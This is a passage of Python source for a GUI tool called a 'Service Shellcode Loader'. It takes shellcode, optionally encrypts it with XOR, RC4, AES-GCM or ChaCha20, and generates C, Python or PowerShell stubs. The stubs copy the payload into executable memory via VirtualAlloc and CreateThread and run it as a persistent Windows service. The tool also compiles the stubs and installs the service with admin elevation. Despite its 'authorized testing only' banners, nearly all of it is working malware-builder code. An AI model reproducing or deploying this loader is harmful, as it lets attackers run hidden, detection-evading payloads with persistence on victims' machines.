        # Default: this script's directory + service_loader.exe
        default = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               "service_loader.exe")
        self.svc_bin_var.set(default)
        self.log(f"Binary path set to: {default}", "info")

    def _install_service(self):
        if not is_admin():
            if messagebox.askyesno("Elevation Required",
                                    "Administrator privileges required.\n"
                                    "Elevate now?"):
                elevate()
            return

        name = self.svc_name_var.get().strip()
        display = self.svc_display_var.get().strip()
        desc = self.svc_desc_var.get().strip()
        bin_path = self.svc_bin_var.get().strip()

        if not name:
            messagebox.showwarning("Missing", "Service name is required.")
            return
        if not bin_path:
            messagebox.showwarning("Missing",
                                    "Binary path is required.\n"
                                    "Click 'Auto (this script)' or choose a file.")
            return
        if not os.path.exists(bin_path):
            if not messagebox.askyesno("File Not Found",
                                        f"Binary does not exist:\n{bin_path}\n\n"
                                        "Continue anyway?"):
                return

        self.log(f"Installing service '{name}'...", "info")
        self.svc_mgr.install(name, display, desc, bin_path)
        self._refresh_status()

    def _uninstall_service(self):
        if not is_admin():
            if messagebox.askyesno("Elevation Required",
                                    "Administrator privileges required.\n"
                                    "Elevate now?"):
                elevate()
            return

        name = self.svc_name_var.get().strip()
        if not name:
            messagebox.showwarning("Missing", "Service name is required.")
            return
        if not messagebox.askyesno("Confirm",
                                    f"Uninstall service '{name}'?"):
            return

        self.svc_mgr.uninstall(name)
        self._refresh_status()

    def _start_service(self):
        if not is_admin():
            if messagebox.askyesno("Elevation Required",
                                    "Administrator privileges required.\n"
                                    "Elevate now?"):
                elevate()
            return

        name = self.svc_name_var.get().strip()
        if not name:
            messagebox.showwarning("Missing", "Service name is required.")
            return

        self.svc_mgr.start(name)
        time.sleep(0.5)
        self._refresh_status()

    def _stop_service(self):
        if not is_admin():
            if messagebox.askyesno("Elevation Required",
                                    "Administrator privileges required.\n"
                                    "Elevate now?"):
                elevate()
            return

        name = self.svc_name_var.get().strip()
        if not name:
            messagebox.showwarning("Missing", "Service name is required.")
            return

        self.svc_mgr.stop(name)
        time.sleep(0.5)
        self._refresh_status()

    def _refresh_status(self):
        name = self.svc_name_var.get().strip()
        if not name:
            return
        status = self.svc_mgr.status(name)
        color_map = {
            "RUNNING":       self.colors["success"],
            "STOPPED":       self.colors["warning"],
            "NOT_INSTALLED": self.colors["fg_dim"],
            "UNKNOWN":       self.colors["fg_dim"],
        }
        self.status_var.set(f"Service '{name}': {status}")
        try:
            self.status_label.config(fg=color_map.get(status, self.colors["fg_dim"]))
        except Exception:
            pass

    # ─────────────── BUILD OPERATIONS ───────────────

    def _choose_output(self):
        path = filedialog.asksaveasfilename(
            title="Save Stub As",
            filetypes=[
                ("C Source", "*.c"),
                ("Python", "*.py"),
                ("PowerShell", "*.ps1"),
                ("All Files", "*.*"),
            ])
        if path:
            self.output_var.set(path)

    def _get_encrypted_payload(self) -> bytes:
        """Return the payload after encryption (or raw)."""
        if not self.shellcode:
            return b""

        alg = self.enc_var.get()
        if alg == "none":
            return self.shellcode

        passphrase = self.key_var.get()
        if not passphrase:
            raise RuntimeError("Encryption requires a key.")

        key = CryptoEngine.derive_key_static(passphrase)
        self.encryption_key = key
        self.encryption_alg = alg

        if alg == "xor":
            return CryptoEngine.xor_encrypt(self.shellcode, key)
        elif alg == "rc4":
            return CryptoEngine.rc4_encrypt(self.shellcode, key)
        elif alg == "aes-gcm":
            return CryptoEngine.aes_gcm_encrypt(self.shellcode, key)
        elif alg == "chacha20":
            return CryptoEngine.chacha20_encrypt(self.shellcode, key)
        else:
            return self.shellcode

    def _build_stub(self):
        if not self.shellcode:
            messagebox.showwarning("Missing", "Load a shellcode file first.")
            return

        try:
            payload = self._get_encrypted_payload()
        except Exception as e:
            messagebox.showerror("Encryption Error", str(e))
            return

        lang = self.lang_var.get()
        name = self.svc_name_var.get().strip() or DEFAULT_SERVICE_NAME

        if lang == "c":
            stub = PayloadBuilder.build_c_stub(payload, name)
        elif lang == "python":
            stub = self._build_python_stub(payload, name)
        elif lang == "powershell":
            stub = self._build_ps1_stub(payload, name)
        else:
            stub = PayloadBuilder.build_c_stub(payload, name)

        # Show in preview
        self.stub_preview.config(state=NORMAL)
        self.stub_preview.delete("1.0", END)
        self.stub_preview.insert("1.0", stub)
        self.stub_preview.config(state=DISABLED)

        # Save if path set
        out_path = self.output_var.get().strip()
        if out_path:
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(stub)
            self.log(f"Stub saved: {out_path}", "success")
        else:
            self.log("Stub generated (no output path — preview only)", "info")

    def _build_python_stub(self, payload: bytes, name: str) -> str:
        b64 = base64.b64encode(payload).decode()
        return f'''#!/usr/bin/env python3
# Auto-generated Python service stub
# Service: {name}
# Generated: {datetime.now().isoformat()}
# FOR AUTHORIZED SECURITY TESTING ONLY

import ctypes
import base64
import win32serviceutil
import win32service
import win32event

SHELLCODE = base64.b64decode("{b64}")
SERVICE_NAME = "{name}"


class ShellcodeService(win32serviceutil.ServiceFramework):
    _svc_name_ = SERVICE_NAME
    _svc_display_name_ = "{name}"
    _svc_description_ = "Authorized security testing only"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        self.RunShellcode()
        win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE)

    def RunShellcode(self):
        sc = SHELLCODE
        kernel32 = ctypes.windll.kernel32
        kernel32.VirtualAlloc.restype = ctypes.c_void_p
        kernel32.VirtualAlloc.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t,
            ctypes.c_uint32, ctypes.c_uint32]
        addr = kernel32.VirtualAlloc(None, len(sc), 0x3000, 0x40)
        ctypes.memmove(addr, sc, len(sc))
        thread = kernel32.CreateThread(None, 0, ctypes.c_void_p(addr),
                                        None, 0, None)
        kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)


if __name__ == "__main__":
    win32serviceutil.HandleCommandLine(ShellcodeService)
'''

    def _build_ps1_stub(self, payload: bytes, name: str) -> str:
        b64 = base64.b64encode(payload).decode()
        return f'''# Auto-generated PowerShell service stub
# Service: {name}
# Generated: {datetime.now().isoformat()}
# FOR AUTHORIZED SECURITY TESTING ONLY

$ServiceName = "{name}"
$Shellcode = [Convert]::FromBase64String("{b64}")

$Kernel32 = Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
        UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        UIntPtr dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle,
        uint dwMilliseconds);
"@ -Name "K32" -Namespace "Svc" -PassThru

$addr = [Svc.K32]::VirtualAlloc([IntPtr]::Zero,
    [UIntPtr]::new($Shellcode.Length), 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $addr,
    $Shellcode.Length)
$h = [Svc.K32]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr,
    [IntPtr]::Zero, 0, [IntPtr]::Zero)
[Svc.K32]::WaitForSingleObject($h, 0xFFFFFFFF) | Out-Null
'''

    def _build_exe(self):
        """Attempt to compile the C stub with MinGW."""
        stub_path = self.output_var.get().strip()
        if not stub_path or not stub_path.endswith(".c"):
            messagebox.showwarning("Missing",
                                    "Set an output path ending in .c first.")
            return

        # Ensure stub is written
        self._build_stub()

        # Find gcc
        import shutil
        gcc = shutil.which("gcc") or shutil.which("x86_64-w64-mingw32-gcc")
        if not gcc:
            messagebox.showwarning("Missing",
                                    "No C compiler found.\n"
                                    "Install MinGW-w64 or Visual Studio build tools.")
            return

        exe_path = stub_path[:-2] + ".exe"
        cmd = f'"{gcc}" -O2 -static -o "{exe_path}" "{stub_path}" -ladvapi32'
        self.log(f"Compiling: {os.path.basename(exe_path)}...", "info")

        out, err, rc = run_hidden(cmd, timeout=120)
        if rc == 0:
            self.log(f"Compiled: {exe_path}", "success")
            self.svc_bin_var.set(exe_path)
            messagebox.showinfo("Success",
                                 f"Compiled to:\n{exe_path}\n\n"
                                 "Binary path updated.")
        else:
            self.log(f"Compile failed: {err}", "error")
            messagebox.showerror("Compile Error",
                                  f"Compilation failed:\n\n{err[:500]}")

    def _copy_stub(self):
        stub = self.stub_preview.get("1.0", END).strip()
        if not stub:
            messagebox.showwarning("Missing", "Build the stub first.")
            return
        self.root.clipboard_clear()
        self.root.clipboard_append(stub)
        self.log("Stub copied to clipboard", "success")

    def _export_stub(self):
        """Export current stub + config as a project."""
        self._save_project()

    # ─────────────── PROJECT I/O ───────────────

    def _save_project(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON", "*.json"), ("All Files", "*.*")])
        if not path:
            return

        data = {
            "version":      APP_VERSION,
            "shellcode_path": self.shellcode_path,
            "shellcode_b64":  base64.b64encode(self.shellcode).decode()
                              if self.shellcode else "",
            "service": {
                "name":         self.svc_name_var.get(),
                "display":      self.svc_display_var.get(),
                "description":  self.svc_desc_var.get(),
                "bin_path":     self.svc_bin_var.get(),
            },
            "encryption": {
                "algorithm": self.enc_var.get(),
                "key":       self.key_var.get(),
            },
            "build": {
                "language":    self.lang_var.get(),
                "output_file": self.output_var.get(),
            },
            "timestamp": datetime.now().isoformat(),
        }

        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)

        self.project_file = path
        self.log(f"Project saved: {path}", "success")

    def _open_project(self):
        path = filedialog.askopenfilename(
            filetypes=[("JSON", "*.json"), ("All Files", "*.*")])
        if not path:
            return

        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception as e:
            messagebox.showerror("Load Error", str(e))
            return

        # Restore
        if data.get("shellcode_b64"):
            self.shellcode = base64.b64decode(data["shellcode_b64"])
            self.shellcode_path = data.get("shellcode_path", "")
            self.path_var.set(self.shellcode_path)
            self.size_label.config(
                text=f"Size: {format_bytes(len(self.shellcode))}")
            h = hashlib.sha256(self.shellcode).hexdigest()
            self.hash_label.config(text=f"SHA-256: {h[:32]}...")
            self._render_hex_preview(self.shellcode)

        svc = data.get("service", {})
        self.svc_name_var.set(svc.get("name", DEFAULT_SERVICE_NAME))
        self.svc_display_var.set(svc.get("display", DEFAULT_DISPLAY_NAME))
        self.svc_desc_var.set(svc.get("description", DEFAULT_DESCRIPTION))
        self.svc_bin_var.set(svc.get("bin_path", ""))

        enc = data.get("encryption", {})
        self.enc_var.set(enc.get("algorithm", "none"))
        self.key_var.set(enc.get("key", ""))

        build = data.get("build", {})
        self.lang_var.set(build.get("language", "c"))
        self.output_var.set(build.get("output_file", ""))

        self.project_file = path
        self.log(f"Project loaded: {path}", "success")

    # ─────────────── HELP ───────────────

    def _random_key(self):
        key = base64.b64encode(secrets.token_bytes(24)).decode()
        self.key_var.set(key)
        self.log("Random encryption key generated", "success")

    def _show_about(self):
        messagebox.showinfo("About",
            f"ABOLO Service Shellcode Loader — Pro v{APP_VERSION}\n\n"
            "FOR AUTHORIZED SECURITY TESTING ONLY.\n\n"
            "Features:\n"
            "  • Multi-format shellcode loading\n"
            "  • XOR / RC4 / AES-GCM / ChaCha20 encryption\n"
            "  • C / Python / PowerShell stub generation\n"
            "  • Full Windows service lifecycle management\n"
            "  • Real-time logging\n\n"
            "Requires:\n"
            "  • Windows 10/11 or Server 2016+\n"
            "  • Python 3.8+\n"
            "  • Administrator privileges\n"
            "  • pycryptodome (for AES/ChaCha20)")


# ═══════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════

def main():
    root = Tk()
    root.title(APP_TITLE)

    # Set icon (optional, safe if missing)
    try:
        root.iconbitmap(default="")
    except Exception:
        pass

    app = ServiceLoaderGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
